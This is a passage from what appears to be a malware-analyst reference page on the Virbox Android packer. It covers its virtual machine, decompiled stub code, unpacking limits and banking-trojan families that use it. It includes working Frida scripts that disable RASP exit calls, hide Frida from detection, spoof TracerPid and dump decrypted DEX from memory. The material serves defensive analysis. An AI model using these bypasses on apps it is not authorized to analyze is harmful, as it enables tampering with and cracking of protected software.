Crossings","text":"<p>Not every method in a protected APK is virtualized. Virbox allows developers to select which classes and methods to virtualize. This creates a boundary between virtualized code (executing inside the Virbox VM) and non-virtualized code (running as normal Dalvik bytecode in ART).</p> <p>Virtualized calling non-virtualized: When VM code needs to invoke a standard Java method, the VM interpreter uses JNI to call back into the Dalvik/ART runtime. The VM marshals arguments from its internal register file into JNI call parameters, invokes <code>CallObjectMethod</code>/<code>CallVoidMethod</code>/etc., and stores the return value back into VM registers.</p> <p>Non-virtualized calling virtualized: The original Java method is replaced with a native stub. When ART dispatches the method call, it hits the JNI stub, which enters the VM interpreter with the method's virtualized bytecode. Arguments are transferred from ART's register frame into the VM's register file.</p> <p>These boundary crossings are observable through JNI hooking and represent one of the few points where you can intercept data flowing through virtualized code.</p>"},{"location":"packers/virbox/#register-mapping","title":"Register Mapping","text":"<p>The Virbox VM maintains its own register file, separate from ART's virtual registers. The VM register count is not constrained by Dalvik's 16-register addressing limit for most instructions. During boundary crossings, a marshaling layer maps between ART registers (v0, v1, ...) and VM registers (r0, r1, ...). The mapping is not one-to-one -- the VM may use more registers than the original Dalvik method due to instruction set differences.</p>"},{"location":"packers/virbox/#why-static-analysis-tools-fail","title":"Why Static Analysis Tools Fail","text":"<p>IDA Pro and Ghidra can disassemble the <code>libvirbox_*.so</code> binary and identify the VM interpreter functions. However, they cannot make sense of the virtualized bytecode because:</p> <ol> <li>The bytecode is data, not native code -- disassemblers will not attempt to decode it</li> <li>The opcode-to-handler mapping is only resolvable at runtime (stored in a table initialized during VM startup)</li> <li>The per-build opcode randomization means no fixed processor module can decode all samples</li> <li>Building a custom IDA processor module requires extracting the opcode table from each individual sample</li> </ol> <p>A custom Ghidra or IDA processor module is theoretically possible per-sample, but extracting the opcode table requires either dynamic analysis of the interpreter initialization or significant manual reverse engineering of the table construction code in <code>libvirbox_*.so</code>.</p>"},{"location":"packers/virbox/#technical-analysis","title":"Technical Analysis","text":""},{"location":"packers/virbox/#stub-application-structure","title":"Stub Application Structure","text":"<pre><code>package v6f7de22b;\n\nclass app extends Application {\n\n    static String TAG = \"virbox\";\n    static Context appContext;\n\n    String nativeLibPath;\n    String realAppClassName;\n    String newResDir;\n    boolean initialized = false;\n    Application realApplication;\n    Object savedProviders;\n\n    native void I6f7de22b_00(Context context);\n    native void I6f7de22b_01(Context context, Application app, String className);\n    native void I6f7de22b_02(Activity activity, Bundle bundle);\n    native void I6f7de22b_03(Activity activity);\n    native void I6f7de22b_04(Activity activity);\n    native void I6f7de22b_05(Network network, NetworkCapabilities caps);\n    native boolean I6f7de22b_06();\n}\n</code></pre>"},{"location":"packers/virbox/#architecture-detection","title":"Architecture Detection","text":"<pre><code>String getLibrarySuffix(String abi, boolean is64bit) {\n    if (!is64bit) {\n        if (abi.contains(\"armeabi\")) return \"_a32.so\";\n        if (abi.contains(\"arm64\"))   return \"_a64.so\";\n        if (abi.contains(\"x86_64\"))  return \"_x64.so\";\n        if (abi.contains(\"x86\"))     return \"_x86.so\";\n        if (abi.contains(\"mips64\"))  return \"_m64.so\";\n        if (abi.contains(\"mips\"))    return \"_mips.so\";\n    } else {\n        if (abi.contains(\"armeabi\")) return \"_x86.so\";\n        if (abi.contains(\"arm64\") || abi.contains(\"x86_64\")) return \"_x64.so\";\n        if (abi.contains(\"x86\"))     return \"_x86.so\";\n        if (abi.contains(\"mips64\"))  return \"_m64.so\";\n        if (abi.contains(\"mips\"))    return \"_mips.so\";\n    }\n    return \"\";\n}\n</code></pre>"},{"location":"packers/virbox/#native-library-extraction","title":"Native Library Extraction","text":"<pre><code>boolean extractAsset(Context ctx, String assetName, String destDir, String destName) {\n    String destPath = destDir + \"/\" + destName;\n    File dir = new File(destDir);\n    if (!dir.exists()) dir.mkdirs();\n\n    File destFile = new File(destPath);\n    InputStream assetStream = ctx.getAssets().open(assetName);\n\n    if (destFile.exists() &amp;&amp; filesAreEqual(assetStream, new FileInputStream(destFile))) {\n        assetStream.close();\n        return true;\n    }\n\n    destFile.delete();\n    assetStream.close();\n\n    assetStream = ctx.getAssets().open(assetName);\n    FileOutputStream fos = new FileOutputStream(destPath);\n\n    byte[] buffer = new byte[1024];\n    int bytesRead;\n    while ((bytesRead = assetStream.read(buffer)) != -1) {\n        fos.write(buffer, 0, bytesRead);\n    }\n\n    assetStream.close();\n    fos.close();\n\n    destFile.setReadable(true, false);\n    destFile.setExecutable(true, false);\n    destFile.setWritable(false, false);\n\n    return true;\n}\n</code></pre>"},{"location":"packers/virbox/#initialization-attachbasecontext","title":"Initialization (attachBaseContext)","text":"<pre><code>void attachBaseContext(Context base) {\n    super.attachBaseContext(base);\n    appContext = base;\n\n    String abi = Build.CPU_ABI;\n    String libSuffix = getLibrarySuffix(abi, false);\n    String libName = \"libvirbox\" + libSuffix;\n\n    String nativeDir = getApplicationInfo().nativeLibraryDir;\n    String dataDir = getFilesDir().getAbsolutePath();\n\n    if (assetExists(base, libName)) {\n        extractAsset(base, libName, dataDir, libName);\n        this.nativeLibPath = dataDir + \"/\" + libName;\n    } else {\n        this.nativeLibPath = nativeDir + \"/\" + libName;\n    }\n\n    System.load(this.nativeLibPath);\n\n    I6f7de22b_00(base);\n\n    saveProviders();\n\n    this.realAppClassName = getRealApplicationClassName();\n\n    if (this.realAppClassName != null) {\n        Class realAppClass = Class.forName(this.realAppClassName);\n        this.realApplication = (Application) realAppClass.newInstance();\n\n        Method attachMethod = Application.class.getDeclaredMethod(\"attach\", Context.class);\n        attachMethod.setAccessible(true);\n        attachMethod.invoke(this.realApplication, base);\n    }\n\n    I6f7de22b_01(base, this.realApplication, this.realAppClassName);\n\n    registerActivityLifecycleCallbacks(new ActivityLifecycleHandler());\n\n    ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);\n    cm.registerDefaultNetworkCallback(new NetworkHandler());\n}\n</code></pre>"},{"location":"packers/virbox/#contentprovider-manipulation","title":"ContentProvider Manipulation","text":"<p>Virbox delays ContentProvider initialization to ensure proper unpacking order:</p> <pre><code>void saveProviders() {\n    Class activityThreadClass = Class.forName(\"android.app.ActivityThread\");\n    Method currentMethod = activityThreadClass.getMethod(\"currentActivityThread\");\n    Object activityThread = currentMethod.invoke(null);\n\n    Object boundApp = getField(activityThread, \"mBoundApplication\").get(activityThread);\n    Field providersField = getField(boundApp, \"providers\");\n\n    this.savedProviders = providersField.get(boundApp);\n    providersField.set(boundApp, null);\n}\n\nvoid restoreProviders() {\n    Class activityThreadClass = Class.forName(\"android.app.ActivityThread\");\n    Method currentMethod = activityThreadClass.getMethod(\"currentActivityThread\");\n    Object activityThread = currentMethod.invoke(null);\n\n    Object boundApp = getField(activityThread, \"mBoundApplication\").get(activityThread);\n    getField(boundApp, \"providers\").set(boundApp, this.savedProviders);\n\n    if (this.savedProviders != null) {\n        Method installProviders = activityThreadClass.getDeclaredMethod(\n            \"installContentProviders\", Context.class, List.class);\n        installProviders.setAccessible(true);\n        installProviders.invoke(activityThread, this.realApplication, this.savedProviders);\n        this.savedProviders = null;\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#application-replacement","title":"Application Replacement","text":"<p>Replaces stub Application with real Application in Android internals:</p> <pre><code>void replaceApplication() {\n    Class activityThreadClass = Class.forName(\"android.app.ActivityThread\");\n    Method currentMethod = activityThreadClass.getMethod(\"currentActivityThread\");\n    Object activityThread = currentMethod.invoke(null);\n\n    Field initialAppField = activityThreadClass.getDeclaredField(\"mInitialApplication\");\n    initialAppField.setAccessible(true);\n    if (initialAppField.get(activityThread) == this) {\n        initialAppField.set(activityThread, this.realApplication);\n    }\n\n    Field allAppsField = activityThreadClass.getDeclaredField(\"mAllApplications\");\n    allAppsField.setAccessible(true);\n    List allApps = (List) allAppsField.get(activityThread);\n    for (int i = 0; i &lt; allApps.size(); i++) {\n        if (allApps.get(i) == this) {\n            allApps.set(i, this.realApplication);\n        }\n    }\n\n    Class loadedApkClass;\n    try {\n        loadedApkClass = Class.forName(\"android.app.LoadedApk\");\n    } catch (ClassNotFoundException e) {\n        loadedApkClass = Class.forName(\"android.app.ActivityThread$PackageInfo\");\n    }\n\n    Field appField = loadedApkClass.getDeclaredField(\"mApplication\");\n    appField.setAccessible(true);\n\n    Field resDirField = loadedApkClass.getDeclaredField(\"mResDir\");\n    resDirField.setAccessible(true);\n\n    Field loadedApkField = null;\n    try {\n        loadedApkField = Application.class.getDeclaredField(\"mLoadedApk\");\n    } catch (NoSuchFieldException e) {}\n\n    String[] packageFields = {\"mPackages\", \"mResourcePackages\"};\n\n    for (String fieldName : packageFields) {\n        Field packagesField = activityThreadClass.getDeclaredField(fieldName);\n        packagesField.setAccessible(true);\n        Map packages = (Map) packagesField.get(activityThread);\n\n        for (Object entry : packages.entrySet()) {\n            Object weakRef = ((Map.Entry) entry).getValue();\n            Object loadedApk = ((WeakReference) weakRef).get();\n\n            if (loadedApk != null &amp;&amp; appField.get(loadedApk) == this) {\n                appField.set(loadedApk, this.realApplication);\n\n                if (this.newResDir != null) {\n                    resDirField.set(loadedApk, this.newResDir);\n                }\n\n                if (loadedApkField != null) {\n                    loadedApkField.set(this.realApplication, loadedApk);\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#resource-replacement","title":"Resource Replacement","text":"<pre><code>void replaceResources() {\n    if (this.newResDir == null) return;\n\n    AssetManager newAssets = AssetManager.class.getConstructor().newInstance();\n    Method addPath = AssetManager.class.getDeclaredMethod(\"addAssetPath\", String.class);\n    addPath.setAccessible(true);\n\n    int result = (Integer) addPath.invoke(newAssets, this.newResDir);\n    if (result == 0) {\n        throw new IllegalStateException(\"Could not create new AssetManager\");\n    }\n\n    if (Build.VERSION.SDK_INT &lt;= 19) {\n        Method ensureBlocks = AssetManager.class.getDeclaredMethod(\"ensureStringBlocks\");\n        ensureBlocks.setAccessible(true);\n        ensureBlocks.invoke(newAssets);\n    }\n\n    Class resourcesManagerClass = Class.forName(\"android.app.ResourcesManager\");\n    Method getInstance = resourcesManagerClass.getDeclaredMethod(\"getInstance\");\n    Object resourcesManager = getInstance.invoke(null);\n\n    Collection resourcesList;\n    try {\n        Field activeField = resourcesManagerClass.getDeclaredField(\"mActiveResources\");\n        activeField.setAccessible(true);\n        resourcesList = ((ArrayMap) activeField.get(resourcesManager)).values();\n    } catch (NoSuchFieldException e) {\n        Field refsField = resourcesManagerClass.getDeclaredField(\"mResourceReferences\");\n        refsField.setAccessible(true);\n        resourcesList = (Collection) refsField.get(resourcesManager);\n    }\n\n    for (Object ref : resourcesList) {\n        Resources res = (Resources) ((WeakReference) ref).get();\n\n        try {\n            Field assetsField = Resources.class.getDeclaredField(\"mAssets\");\n            assetsField.setAccessible(true);\n            assetsField.set(res, newAssets);\n        } catch (NoSuchFieldException e) {\n            Field implField = Resources.class.getDeclaredField(\"mResourcesImpl\");\n            implField.setAccessible(true);\n            Object impl = implField.get(res);\n\n            Field implAssetsField = impl.getClass().getDeclaredField(\"mAssets\");\n            implAssetsField.setAccessible(true);\n            implAssetsField.set(impl, newAssets);\n        }\n\n        res.updateConfiguration(res.getConfiguration(), res.getDisplayMetrics());\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#oncreate-execution","title":"onCreate Execution","text":"<pre><code>void onCreate() {\n    if (this.realApplication != null) {\n        replaceApplication();\n        replaceResources();\n        restoreProviders();\n    }\n\n    super.onCreate();\n\n    if (this.realApplication != null) {\n        this.realApplication.onCreate();\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#activity-lifecycle-monitoring","title":"Activity Lifecycle Monitoring","text":"<pre><code>class ActivityLifecycleHandler implements ActivityLifecycleCallbacks {\n    Handler handler = new Handler();\n    Runnable hijackDetector;\n\n    void cancelHijackCheck() {\n        if (hijackDetector != null) {\n            handler.removeCallbacks(hijackDetector);\n            hijackDetector = null;\n        }\n    }\n\n    void scheduleHijackCheck(Activity activity) {\n        if (activity == null || activity.isFinishing() || activity.isDestroyed()) {\n            return;\n        }\n\n        hijackDetector = new Runnable() {\n            WeakReference&lt;Activity&gt; activityRef = new WeakReference&lt;&gt;(activity);\n\n            void run() {\n                Activity act = activityRef.get();\n                if (act != null &amp;&amp; !act.isFinishing() &amp;&amp; !act.isDestroyed()) {\n                    String msg = isChineseLocale()\n                        ? \"\u5e94\u7528\u5df2\u88ab\u5207\u6362\u81f3\u540e\u53f0\"\n                        : \"App has been switched to background\";\n                    Toast.makeText(act, msg, Toast.LENGTH_SHORT).show();\n                }\n            }\n        };\n\n        handler.postDelayed(hijackDetector, 1000);\n    }\n\n    void onActivityCreated(Activity activity, Bundle state) {\n        I6f7de22b_02(activity, state);\n    }\n\n    void onActivityStarted(Activity activity) {\n        I6f7de22b_03(activity);\n    }\n\n    void onActivityResumed(Activity activity) {\n        cancelHijackCheck();\n    }\n\n    void onActivityPaused(Activity activity) {\n        if (I6f7de22b_06()) {\n            scheduleHijackCheck(activity);\n        }\n        I6f7de22b_04(activity);\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#network-monitoring","title":"Network Monitoring","text":"<pre><code>class NetworkHandler extends ConnectivityManager.NetworkCallback {\n    void onCapabilitiesChanged(Network network, NetworkCapabilities caps) {\n        I6f7de22b_05(network, caps);\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#reflection-helper","title":"Reflection Helper","text":"<pre><code>Field getField(Object obj, String fieldName) {\n    Class cls = obj.getClass();\n    while (cls != null) {\n        try {\n            Field field = cls.getDeclaredField(fieldName);\n            field.setAccessible(true);\n            return field;\n        } catch (NoSuchFieldException e) {\n            cls = cls.getSuperclass();\n        }\n    }\n    throw new IllegalStateException(fieldName);\n}\n</code></pre>"},{"location":"packers/virbox/#reflection-targets-summary","title":"Reflection Targets Summary","text":""},{"location":"packers/virbox/#activitythread","title":"ActivityThread","text":"Field Purpose <code>mInitialApplication</code> Primary Application reference <code>mAllApplications</code> List of all Application instances <code>mBoundApplication</code> AppBindData containing providers <code>mPackages</code> Package name to LoadedApk map <code>mResourcePackages</code> Resource package map"},{"location":"packers/virbox/#loadedapk","title":"LoadedApk","text":"Field Purpose <code>mApplication</code> Application instance reference <code>mResDir</code> Resource directory path"},{"location":"packers/virbox/#resourcesmanager","title":"ResourcesManager","text":"Field Purpose <code>mActiveResources</code> Active Resources map (older Android) <code>mResourceReferences</code> Resource references (newer Android)"},{"location":"packers/virbox/#appbinddata","title":"AppBindData","text":"Field Purpose <code>providers</code> List of ContentProvider info"},{"location":"packers/virbox/#unpacking-methodology","title":"Unpacking Methodology","text":"<p>Virbox is the hardest commercial Android packer to unpack. Standard DEX dumping techniques that work against Tencent Legu, Bangcle, or even DexProtector are ineffective here because the core protection is not encryption -- it is virtualization. The original Dalvik bytecode for protected methods does not exist in memory at any point during execution. There is no \"dump window\" for virtualized methods because those methods never return to Dalvik bytecode form. They execute as native VM code inside the interpreter.</p> <p>This fundamentally changes the analyst's approach. Instead of trying to recover the original code, the goal shifts to extracting behavioral information through dynamic observation.</p>"},{"location":"packers/virbox/#frida-dexdump-limitations","title":"frida-dexdump Limitations","text":"<p>Tools like frida-dexdump scan process memory for DEX magic bytes (<code>dex\\n035\\0</code> or <code>dex\\n039\\0</code>) and dump any DEX structures they find. Against Virbox, this will recover:</p> <ul> <li>The stub DEX containing the Virbox loader classes</li> <li>Any non-virtualized DEX code (if the developer only virtualized selected methods)</li> <li>The encrypted original DEX in some configurations (which cannot be used without the decryption key)</li> </ul> <p>It will not recover the virtualized methods. Those methods exist only as proprietary bytecode interpreted by the native VM. frida-dexdump has no way to recognize or extract this data because it is not in DEX format.</p>"},{"location":"packers/virbox/#vm-interpreter-analysis","title":"VM Interpreter Analysis","text":"<p>The most technically demanding approach targets the VM interpreter itself. The goal is to hook the dispatch loop and log opcode execution to reconstruct what the virtualized code does.</p> <pre><code>var libvirbox = Process.findModuleByName(\"libvirbox_a64.so\");\n\nvar exports = libvirbox.enumerateExports();\nvar symbols = libvirbox.enumerateSymbols();\n\nvar vmDispatch = null;\nexports.forEach(function(exp) {\n    if (exp.name.indexOf(\"vm_dispatch\") !== -1 ||\n        exp.name.indexOf(\"interpreter\") !== -1) {\n        vmDispatch = exp.address;\n    }\n});\n\nif (vmDispatch) {\n    Interceptor.attach(vmDispatch, {\n        onEnter: function(args) {\n            console.log(\"[VM] dispatch called from \" +\n                Thread.backtrace(this.context, Backtracer.ACCURATE)\n                    .map(DebugSymbol.fromAddress).join(\"\\n\"));\n        }\n    });\n}\n</code></pre> <p>Since exports are typically stripped, a more practical approach is scanning for the dispatch loop pattern in the <code>.text</code> section:</p> <pre><code>var libvirbox = Process.findModuleByName(\"libvirbox_a64.so\");\nvar baseAddr = libvirbox.base;\nvar size = libvirbox.size;\n\nMemory.scan(baseAddr, size, \"?? ?? ?? ?? 1F 20 03 D5 ?? ?? ?? 94\", {\n    onMatch: function(address, size) {\n        console.log(\"[SCAN] potential dispatch at: \" + address);\n    },\n    onComplete: function() {\n        console.log(\"[SCAN] complete\");\n    }\n});\n</code></pre> <p>This approach requires significant per-sample effort and is rarely worth pursuing unless the objective is understanding the VM itself rather than the protected application.</p>"},{"location":"packers/virbox/#bypassing-rasp","title":"Bypassing RASP","text":"<p>Before any dynamic analysis can begin, the RASP checks must be neutralized. Virbox's RASP will terminate the process via <code>System.exit()</code> or <code>Runtime.exit()</code> when it detects debugging, rooting, emulation, or injection. The most reliable approach is to block all exit paths early in spawn mode.</p>"},{"location":"packers/virbox/#blocking-process-termination","title":"Blocking Process Termination","text":"<pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"[RASP] System.exit(\" + code + \") blocked\");\n        console.log(Java.use(\"android.util.Log\")\n            .getStackTraceString(Java.use(\"java.lang.Exception\").$new()));\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"[RASP] Runtime.exit(\" + code + \") blocked\");\n        console.log(Java.use(\"android.util.Log\")\n            .getStackTraceString(Java.use(\"java.lang.Exception\").$new()));\n    };\n\n    var Process = Java.use(\"android.os.Process\");\n    Process.killProcess.implementation = function(pid) {\n        console.log(\"[RASP] killProcess(\" + pid + \") blocked\");\n    };\n});\n</code></pre>"},{"location":"packers/virbox/#defeating-anti-frida-detection","title":"Defeating Anti-Frida Detection","text":"<p>Virbox scans <code>/proc/self/maps</code> for Frida artifacts and checks for the Frida server port. Use reFrida to avoid common detection signatures, or manually patch the detection:</p> <pre><code>var openPtr = Module.findExportByName(null, \"open\");\nInterceptor.attach(openPtr, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; this.path.indexOf(\"/proc/\") !== -1 &amp;&amp;\n            this.path.indexOf(\"/maps\") !== -1) {\n            this.isMaps = true;\n            this.fd = retval.toInt32();\n        }\n    }\n});\n\nvar readPtr = Module.findExportByName(null, \"read\");\nInterceptor.attach(readPtr, {\n    onLeave: function(retval) {\n        if (this.isMaps) {\n            var buf = this.context.x1;\n            var content = buf.readUtf8String(retval.toInt32());\n            if (content.indexOf(\"frida\") !== -1 || content.indexOf(\"gadget\") !== -1) {\n                var cleaned = content.replace(/.*frida.*/gi, \"\")\n                                     .replace(/.*gadget.*/gi, \"\");\n                buf.writeUtf8String(cleaned);\n            }\n        }\n    }\n});\n</code></pre>"},{"location":"packers/virbox/#tracerpid-bypass","title":"TracerPid Bypass","text":"<pre><code>var fopen = Module.findExportByName(null, \"fopen\");\nInterceptor.attach(fopen, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; this.path.indexOf(\"/proc/\") !== -1 &amp;&amp;\n            this.path.indexOf(\"/status\") !== -1) {\n            this.statusFile = retval;\n        }\n    }\n});\n\nvar fgets = Module.findExportByName(null, \"fgets\");\nInterceptor.attach(fgets, {\n    onLeave: function(retval) {\n        if (retval &amp;&amp; !retval.isNull()) {\n            var line = retval.readUtf8String();\n            if (line &amp;&amp; line.indexOf(\"TracerPid\") !== -1) {\n                retval.writeUtf8String(\"TracerPid:\\t0\\n\");\n            }\n        }\n    }\n});\n</code></pre>"},{"location":"packers/virbox/#hooking-native-library-loading","title":"Hooking Native Library Loading","text":"<p>Intercepting <code>System.loadLibrary</code> and <code>System.load</code> reveals the order in which Virbox loads its components and helps identify the right moment to attach further hooks:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n\n    System.loadLibrary.implementation = function(name) {\n        console.log(\"[LIB] System.loadLibrary: \" + name);\n        this.loadLibrary(name);\n        if (name.indexOf(\"virbox\") !== -1) {\n            console.log(\"[LIB] Virbox native library loaded, attaching hooks...\");\n            hookVirboxInternals();\n        }\n    };\n\n    System.load.implementation = function(path) {\n        console.log(\"[LIB] System.load: \" + path);\n        this.load(path);\n        if (path.indexOf(\"virbox\") !== -1) {\n            console.log(\"[LIB] Virbox native library loaded from: \" + path);\n            hookVirboxInternals();\n        }\n    };\n});\n\nfunction hookVirboxInternals() {\n    var mod = Process.findModuleByName(\"libvirbox_a64.so\");\n    if (!mod) mod = Process.findModuleByName(\"libvirbox_a32.so\");\n    if (!mod) return;\n\n    console.log(\"[LIB] Module base: \" + mod.base + \" size: \" + mod.size);\n\n    mod.enumerateExports().forEach(function(exp) {\n        console.log(\"[EXPORT] \" + exp.name + \" @ \" + exp.address);\n    });\n}\n</code></pre>"},{"location":"packers/virbox/#memory-analysis","title":"Memory Analysis","text":"<p>For the DEX encryption mode (as opposed to virtualization), there is a window during which decrypted DEX data exists in memory. Scanning <code>/proc/self/maps</code> for anonymous memory regions with the right characteristics can locate decrypted content:</p> <pre><code>function scanForDex() {\n    var maps = File.readAllText(\"/proc/self/maps\");\n    var lines = maps.split(\"\\n\");\n\n    lines.forEach(function(line) {\n        if (line.indexOf(\"rw\") !== -1 &amp;&amp; line.indexOf(\"/\") === -1) {\n            var parts = line.split(\"-\");\n            var start = ptr(\"0x\" + parts[0]);\n            try {\n                var magic = start.readByteArray(4);\n                var header = new Uint8Array(magic);\n                if (header[0] === 0x64 &amp;&amp; header[1] === 0x65 &amp;&amp;\n                    header[2] === 0x78 &amp;&amp; header[3] === 0x0a) {\n                    var fileSize = start.add(32).readU32();\n                    console.log(\"[DEX] Found at \" + start + \" size: \" + fileSize);\n                    var dexData = start.readByteArray(fileSize);\n                    var f = new File(\"/data/local/tmp/dumped_\" +\n                        start.toString().slice(2) + \".dex\", \"wb\");\n                    f.write(dexData);\n                    f.close();\n                    console.log(\"[DEX] Dumped to /data/local/tmp/\");\n                }\n            } catch(e) {}\n        }\n    });\n}\n\nJava.perform(function() {\n    var Activity = Java.use(\"android.app.Activity\");\n    Activity.onResume.implementation = function() {\n        this.onResume();\n        scanForDex();\n    };\n});\n</code></pre> <p>This works for DEX encryption but not for DEX virtualization. For virtualized methods, the bytecode never appears in DEX form in memory.</p>"},{"location":"packers/virbox/#intercepting-network-calls-from-virtualized-code","title":"Intercepting Network Calls from Virtualized Code","text":"<p>Even when code is virtualized, its network communications pass through standard Android APIs. Hooking at the network layer captures C2 URLs, exfiltrated data, and command protocols regardless of code protection:</p> <pre><code>Java.perform(function() {\n    var URL = Java.use(\"java.net.URL\");\n    URL.$init.overload(\"java.lang.String\").implementation = function(url) {\n        console.log(\"[NET] URL: \" + url);\n        this.$init(url);\n    };\n\n    var HttpURLConnection = Java.use(\"java.net.HttpURLConnection\");\n    HttpURLConnection.setRequestProperty.implementation = function(key, value) {\n        console.log(\"[NET] Header: \" + key + \": \" + value);\n        this.setRequestProperty(key, value);\n    };\n\n    var OkHttpClient;\n    try {\n        OkHttpClient = Java.use(\"okhttp3.OkHttpClient\");\n        var RealCall = Java.use(\"okhttp3.internal.connection.RealCall\");\n        RealCall.execute.implementation = function() {\n            var request = this.request();\n            console.log(\"[OKHTTP] \" + request.method() + \" \" + request.url());\n            return this.execute();\n        };\n    } catch(e) {}\n\n    try {\n        var WebView = Java.use(\"android.webkit.WebView\");\n        WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n            console.log(\"[WEBVIEW] loadUrl: \" + url);\n            this.loadUrl(url);\n        };\n    } catch(e) {}\n});\n</code></pre>"},{"location":"packers/virbox/#partial-analysis-strategy","title":"Partial Analysis Strategy","text":"<p>When full unpacking is infeasible (which is the common case for Virbox-virtualized samples), shift to behavioral analysis:</p> <ul> <li>Network traffic: Use mitmproxy or Burp Suite with SSL pinning bypass to capture all HTTP/HTTPS traffic. C2 URLs, exfiltration endpoints, and command structures are all visible regardless of code protection.</li> <li>File system activity: Monitor file creation, reads, and writes using <code>inotifywait</code> or Frida hooks on <code>open()</code>, <code>write()</code>, <code>unlink()</code>. Credential storage, configuration files, and staging directories become visible.</li> <li>IPC observation: Hook <code>startActivity</code>, <code>startService</code>, <code>sendBroadcast</code>, and <code>ContentResolver</code> operations to map the application's interaction with other components and apps.</li> <li>Accessibility service abuse: If the malware registers an AccessibilityService, hook <code>onAccessibilityEvent</code> to log every UI interaction the malware performs.</li> <li>SharedPreferences: Hook <code>SharedPreferences.Editor</code> methods to capture configuration values the malware stores locally.</li> </ul> <p>This behavioral approach often yields sufficient intelligence for threat reporting without ever recovering the original bytecode.</p>"},{"location":"packers/virbox/#malware-usage","title":"Malware Usage","text":""},{"location":"packers/virbox/#klopatra-banking-trojan-2025","title":"Klopatra Banking Trojan (2025)","text":"<p>Virbox was discovered protecting the Klopatra Android banking trojan targeting Turkish financial institutions.</p> <ul> <li>Described as \"rarely seen in the Android threat landscape\"</li> <li>Combined with native libraries for maximum evasion</li> <li>Analysis only succeeded via unprotected development build</li> <li>Protection \"drastically increases time and expertise required\"</li> </ul>"},{"location":"packers/virbox/#gigabud-spynote-infrastructure-2024","title":"Gigabud + SpyNote Infrastructure (2024)","text":"<p>Zimperium zLabs revealed that both Gigabud (a banking credential stealer) and SpyNote were protected by Virbox across shared distribution infrastructure. The investigation identified 79 phishing sites and 11 C2 servers distributing both families, targeting 50+ financial apps. This represents the first documented case of Virbox protecting multiple distinct malware families operating through coordinated infrastructure.</p>"},{"location":"packers/virbox/#goldfactory-group","title":"GoldFactory Group","text":"<p>GoldFactory is the Chinese-speaking threat group that standardized on Virbox across its entire malware portfolio. The group operates GoldDigger, GoldPickaxe, GoldDiggerPlus, and Gigabud -- all Android banking trojans that use Virbox as their primary protection layer.</p>"},{"location":"packers/virbox/#why-virbox","title":"Why Virbox","text":"<p>GoldFactory's selection of Virbox is not arbitrary. Several factors make it the natural choice for a Chinese-speaking cybercrime operation focused on financial fraud:</p> <ul> <li>Chinese origin: SenseShield Technology operates primarily in Chinese, with documentation, support, and licensing infrastructure accessible to Chinese-speaking buyers. Procurement is straightforward compared to Western protectors like DexGuard or Arxan.</li> <li>VM-level protection: Financial fraud malware has a short operational window. Virbox's DEX virtualization buys time against incident responders and malware analysts -- even partial analysis requires days of effort per sample.</li> <li>RASP suite: The built-in anti-debugging, anti-rooting, and anti-emulation checks provide defense-in-depth without requiring the malware authors to implement their own.</li> <li>Legitimate cover: Because Virbox is a legitimate commercial product used by many non-malicious apps, its presence alone does not flag the APK as malicious in automated scanning pipelines.</li> </ul>"},{"location":"packers/virbox/#goldpickaxe-and-biometric-theft","title":"GoldPickaxe and Biometric Theft","text":"<p>GoldPickaxe is the most technically notable member of the GoldFactory family. It steals facial biometric data from victims by tricking them into recording face videos, then uses AI-generated deepfakes to bypass bank face-verification systems. The Android variant wraps this entire workflow in Virbox virtualization, meaning the facial capture logic, deepfake preparation, and exfiltration code are all protected by the VM. This makes it exceptionally difficult to analyze the biometric theft mechanism through static analysis.</p> <p>The iOS variant of GoldPickaxe cannot use Virbox (which does not support iOS app protection in the same way), so cross-platform comparison between the Android and iOS variants has been one route for analysts to infer what the Android variant's virtualized code does.</p>"},{"location":"packers/virbox/#gigabud-and-infrastructure-overlap","title":"Gigabud and Infrastructure Overlap","text":"<p>Zimperium's September 2024 investigation revealed that Gigabud and SpyNote shared distribution infrastructure (79 phishing sites, 11 C2 servers), with both families protected by Virbox. Cyble's August 2024 analysis confirmed code-level overlap between Gigabud and GoldDigger, with both using <code>libstrategy.so</code> for UI interaction alongside Virbox packing. This makes GoldFactory the first documented threat group to deploy Virbox consistently across multiple distinct malware families operating through coordinated infrastructure.</p>"},{"location":"packers/virbox/#attribution-indicators","title":"Attribution Indicators","text":"Indicator Details Language Chinese-language strings in development artifacts, Chinese-language C2 panels Targeting Southeast Asia (Thailand, Vietnam, Philippines), expanding to Latin America and South Africa Operational model Highly localized lures impersonating government services and banking apps Technical signature Consistent use of Virbox across all family members, shared <code>libstrategy.so</code> library Timeline GoldDigger (2023), GoldDiggerPlus (2023-2024), GoldPickaxe (2024), Gigabud (active since 2022, linked 2024)"},{"location":"packers/virbox/#analyst-workflow","title":"Analyst Workflow","text":""},{"location":"packers/virbox/#step-by-step-procedure","title":"Step-by-Step Procedure","text":"<p>Step 1: Triage and Identification</p> <p>Confirm Virbox protection by checking for the artifacts listed in the Identification section. Run APKiD if available. Look for <code>libvirbox_*.so</code> in the lib or assets directory, hex-based package names, and the <code>\"virbox\"</code> string tag.</p> <p>Step 2: Determine Virtualization Scope</p> <p>Not all methods in a Virbox-protected APK are virtualized. Developers choose which classes and methods to protect. Decompile the APK with jadx and examine the output:</p> <ul> <li>Methods that decompile normally contain standard Dalvik bytecode and are not virtualized</li> <li>Methods that show only a <code>native</code> declaration with a hex-prefixed name (e.g., <code>I6f7de22b_02</code>) are virtualized</li> <li>If jadx recovers substantial application logic, the sample is only partially virtualized, and static analysis remains viable for the non-virtualized portions</li> </ul> <p>Step 3: Static Analysis of Non-Virtualized Code</p> <p>Extract everything possible from the readable portions:</p> <ul> 